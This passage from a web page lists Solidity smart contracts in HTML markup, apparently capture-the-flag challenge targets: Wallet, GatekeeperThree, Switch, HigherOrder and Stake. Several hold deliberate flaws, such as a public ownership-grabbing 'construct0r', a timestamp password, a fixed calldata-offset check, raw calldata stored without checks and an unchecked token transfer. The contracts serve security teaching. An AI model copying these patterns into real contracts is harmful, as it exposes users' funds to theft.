        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">revert</span> <span class="token function">InsufficientBalance</span><span class="token punctuation">(</span>currentBalance<span class="token punctuation">,</span> amount_<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">Wallet</span> <span class="token punctuation">{</span>
    <span class="token comment">// The owner of the wallet instance</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>

    Coin <span class="token keyword">public</span> coin<span class="token punctuation">;</span>

    error <span class="token function">OnlyOwner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    error <span class="token function">NotEnoughBalance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">modifier</span> <span class="token function">onlyOwner</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">!=</span> owner<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">revert</span> <span class="token function">OnlyOwner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">_</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">donate10</span><span class="token punctuation">(</span><span class="token builtin">address</span> dest_<span class="token punctuation">)</span> <span class="token keyword">external</span> onlyOwner <span class="token punctuation">{</span>
        <span class="token comment">// check balance left</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>coin<span class="token punctuation">.</span><span class="token function">balances</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">revert</span> <span class="token function">NotEnoughBalance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token comment">// donate 10 coins</span>
            coin<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>dest_<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">transferRemainder</span><span class="token punctuation">(</span><span class="token builtin">address</span> dest_<span class="token punctuation">)</span> <span class="token keyword">external</span> onlyOwner <span class="token punctuation">{</span>
        <span class="token comment">// transfer balance left</span>
        coin<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>dest_<span class="token punctuation">,</span> coin<span class="token punctuation">.</span><span class="token function">balances</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">setCoin</span><span class="token punctuation">(</span>Coin coin_<span class="token punctuation">)</span> <span class="token keyword">external</span> onlyOwner <span class="token punctuation">{</span>
        coin <span class="token operator">=</span> coin_<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">interface</span> <span class="token class-name">INotifyable</span> <span class="token punctuation">{</span>
    <span class="token keyword">function</span> <span class="token function">notify</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">external</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="gatekeeperthree" tabindex="-1"><a class="header-anchor" href="#gatekeeperthree" aria-hidden="true">#</a> GatekeeperThree</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">SimpleTrick</span> <span class="token punctuation">{</span>
    GatekeeperThree <span class="token keyword">public</span> target<span class="token punctuation">;</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> trick<span class="token punctuation">;</span>
    <span class="token builtin">uint256</span> <span class="token keyword">private</span> password <span class="token operator">=</span> block<span class="token punctuation">.</span>timestamp<span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span> _target<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        target <span class="token operator">=</span> <span class="token function">GatekeeperThree</span><span class="token punctuation">(</span>_target<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">checkPassword</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _password<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>_password <span class="token operator">==</span> password<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        password <span class="token operator">=</span> block<span class="token punctuation">.</span>timestamp<span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">trickInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        trick <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">trickyTrick</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token operator">==</span> msg<span class="token punctuation">.</span>sender <span class="token operator">&amp;&amp;</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token operator">!=</span> trick<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            target<span class="token punctuation">.</span><span class="token function">getAllowance</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">GatekeeperThree</span> <span class="token punctuation">{</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> entrant<span class="token punctuation">;</span>
    <span class="token builtin">bool</span> <span class="token keyword">public</span> allowEntrance<span class="token punctuation">;</span>

    SimpleTrick <span class="token keyword">public</span> trick<span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">construct0r</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">modifier</span> <span class="token function">gateOne</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>tx<span class="token punctuation">.</span>origin <span class="token operator">!=</span> owner<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">_</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">modifier</span> <span class="token function">gateTwo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>allowEntrance <span class="token operator">==</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">_</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">modifier</span> <span class="token function">gateThree</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance <span class="token operator">&gt;</span> <span class="token number">0.001</span> ether <span class="token operator">&amp;&amp;</span> <span class="token keyword">payable</span><span class="token punctuation">(</span>owner<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token number">0.001</span> ether<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">_</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">getAllowance</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _password<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>trick<span class="token punctuation">.</span><span class="token function">checkPassword</span><span class="token punctuation">(</span>_password<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            allowEntrance <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">createTrick</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        trick <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimpleTrick</span><span class="token punctuation">(</span><span class="token keyword">payable</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        trick<span class="token punctuation">.</span><span class="token function">trickInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">enter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> gateOne gateTwo gateThree <span class="token punctuation">{</span>
        entrant <span class="token operator">=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="switch" tabindex="-1"><a class="header-anchor" href="#switch" aria-hidden="true">#</a> Switch</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">Switch</span> <span class="token punctuation">{</span>
    <span class="token builtin">bool</span> <span class="token keyword">public</span> switchOn<span class="token punctuation">;</span> <span class="token comment">// switch is off</span>
    <span class="token builtin">bytes4</span> <span class="token keyword">public</span> offSelector <span class="token operator">=</span> <span class="token builtin">bytes4</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token string">&quot;turnSwitchOff()&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">modifier</span> <span class="token function">onlyThis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;Only the contract can call this&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">_</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">modifier</span> <span class="token function">onlyOff</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// we use a complex data type to put in memory</span>
        <span class="token builtin">bytes32</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> selector<span class="token punctuation">;</span>
        <span class="token comment">// check that the calldata at position 68 (location of _data)</span>
        <span class="token keyword">assembly</span> <span class="token punctuation">{</span>
            <span class="token function">calldatacopy</span><span class="token punctuation">(</span>selector<span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment">// grab function selector from calldata</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>selector<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> offSelector<span class="token punctuation">,</span> <span class="token string">&quot;Can only call the turnOffSwitch function&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">_</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">flipSwitch</span><span class="token punctuation">(</span><span class="token builtin">bytes</span> <span class="token keyword">memory</span> _data<span class="token punctuation">)</span> <span class="token keyword">public</span> onlyOff <span class="token punctuation">{</span>
        <span class="token punctuation">(</span><span class="token builtin">bool</span> success<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>_data<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>success<span class="token punctuation">,</span> <span class="token string">&quot;call failed :(&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">turnSwitchOn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> onlyThis <span class="token punctuation">{</span>
        switchOn <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">turnSwitchOff</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> onlyThis <span class="token punctuation">{</span>
        switchOn <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="higherorder" tabindex="-1"><a class="header-anchor" href="#higherorder" aria-hidden="true">#</a> HigherOrder</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token number">0.6</span><span class="token number">.12</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">HigherOrder</span> <span class="token punctuation">{</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> commander<span class="token punctuation">;</span>

    <span class="token builtin">uint256</span> <span class="token keyword">public</span> treasury<span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">registerTreasury</span><span class="token punctuation">(</span><span class="token builtin">uint8</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token keyword">assembly</span> <span class="token punctuation">{</span>
            <span class="token function">sstore</span><span class="token punctuation">(</span>treasury_slot<span class="token punctuation">,</span> <span class="token function">calldataload</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">claimLeadership</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>treasury <span class="token operator">&gt;</span> <span class="token number">255</span><span class="token punctuation">)</span> commander <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
        <span class="token keyword">else</span> <span class="token keyword">revert</span><span class="token punctuation">(</span><span class="token string">&quot;Only members of the Higher Order can become Commander&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="stake" tabindex="-1"><a class="header-anchor" href="#stake" aria-hidden="true">#</a> Stake</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span>
<span class="token keyword">contract</span> <span class="token class-name">Stake</span> <span class="token punctuation">{</span>

    <span class="token builtin">uint256</span> <span class="token keyword">public</span> totalStaked<span class="token punctuation">;</span>
    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token keyword">public</span> UserStake<span class="token punctuation">;</span>
    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token keyword">public</span> Stakers<span class="token punctuation">;</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> WETH<span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _weth<span class="token punctuation">)</span> <span class="token keyword">payable</span><span class="token punctuation">{</span>
        totalStaked <span class="token operator">+=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
        WETH <span class="token operator">=</span> _weth<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">StakeETH</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">&gt;</span> <span class="token number">0.001</span> ether<span class="token punctuation">,</span> <span class="token string">&quot;Don&#39;t be cheap&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        totalStaked <span class="token operator">+=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
        UserStake<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
        Stakers<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">StakeWETH</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>amount <span class="token operator">&gt;</span>  <span class="token number">0.001</span> ether<span class="token punctuation">,</span> <span class="token string">&quot;Don&#39;t be cheap&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">(</span><span class="token punctuation">,</span><span class="token builtin">bytes</span> <span class="token keyword">memory</span> allowance<span class="token punctuation">)</span> <span class="token operator">=</span> WETH<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSelector</span><span class="token punctuation">(</span><span class="token number">0xdd62ed3e</span><span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token function">bytesToUint</span><span class="token punctuation">(</span>allowance<span class="token punctuation">)</span> <span class="token operator">&gt;=</span> amount<span class="token punctuation">,</span><span class="token string">&quot;How am I moving the funds honey?&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        totalStaked <span class="token operator">+=</span> amount<span class="token punctuation">;</span>
        UserStake<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> amount<span class="token punctuation">;</span>
        <span class="token punctuation">(</span><span class="token builtin">bool</span> transfered<span class="token punctuation">,</span> <span class="token punctuation">)</span> <span class="token operator">=</span> WETH<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSelector</span><span class="token punctuation">(</span><span class="token number">0x23b872dd</span><span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span>amount<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Stakers<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> transfered<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">Unstake</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>UserStake<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">&gt;=</span> amount<span class="token punctuation">,</span><span class="token string">&quot;Don&#39;t be greedy&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        UserStake<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> amount<span class="token punctuation">;</span>
        totalStaked <span class="token operator">-=</span> amount<span class="token punctuation">;</span>
        <span class="token punctuation">(</span><span class="token builtin">bool</span> success<span class="token punctuation">,</span> <span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token keyword">payable</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">.</span>call<span class="token punctuation">{</span>value <span class="token punctuation">:</span> amount<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> success<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">bytesToUint</span><span class="token punctuation">(</span><span class="token builtin">bytes</span> <span class="token keyword">memory</span> data<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>length <span class="token operator">&gt;=</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token string">&quot;Data length must be at least 32 bytes&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token builtin">uint256</span> result<span class="token punctuation">;</span>
